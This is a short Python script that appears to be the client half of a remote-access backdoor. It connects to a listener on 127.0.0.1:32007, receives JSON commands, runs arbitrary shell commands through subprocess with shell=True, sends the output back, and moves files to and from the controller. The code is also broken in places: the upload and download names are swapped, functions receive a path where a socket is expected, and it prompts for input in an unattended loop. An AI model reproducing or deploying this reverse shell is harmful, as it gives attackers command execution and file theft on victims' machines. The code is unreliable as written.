import json
import os
import socket
import subprocess
import time

def uploadFile(connection):

    path_remote= input("Enter Remote path:")

    #send action
    action = json.dumps({"action": "download", "path": path_remote})
    connection.send(action)

    #get filesize
    datasize = connection.recv(2048)
    filesize = int(datasize)

    #get filename
    filepath = os.path.basename(path_remote)

    #receive data
    try:
        datareceive = []
        received = 0
        #will read while both size are different
        while filesize > received:
            data = connection.recv(min(filesize - received,2048))
            datareceive.append(data)
            received += len(data)

        #write received file
        file_to_write = open(os.path.join("test",filepath), 'wb')
        file_to_write.write(''.join(datareceive))
        file_to_write.close()

    except Exception as error:
        print (error)

def downloadFile(connection):
    path_upload = input("Enter upload filename:")

    try:
        if os.path.exists(path_upload):

            #send action
            action = json.dumps({"action": "upload", "path": path_upload})
            connection.send(action)

            time.sleep(2)

            #get filesize
            send_data = open(path_upload, 'rb').read()
            length = len(send_data)

            #send filesize
            connection.sendall(str(length))

            totalsend = 0
            while totalsend < len(send_data):
                sent = connection.send(send_data[totalsend:])
                totalsend += sent

    except Exception as error:
        print (error)


def executeRemoteCommand(connection):

    try:
        #receive command
        data_receive = connection.recv(8192)

        #create subprocess for execute command
        proc = subprocess.Popen(data_receive, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()

        #send execute result
        if not stdout_value: stdout_value = 'ok'
        connection.sendall(stdout_value)

    except Exception as e:
        pass
    






try:
    newsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    newsocket.connect(("127.0.0.1", 32007))

    while True:

        try:
            data_receive = newsocket.recv(8192)
            jsonAction = json.loads(data_receive)

            if jsonAction['action'] == "download":
                downloadFile(jsonAction['path'])
            elif jsonAction['action'] == "upload":
                uploadFile(jsonAction['path'])
            elif jsonAction['action'] == "command":
                executeRemoteCommand(newsocket)

        except Exception as e:
            time.sleep(2)
            continue

except Exception as e:
    newsocket.close()
    time.sleep(10)


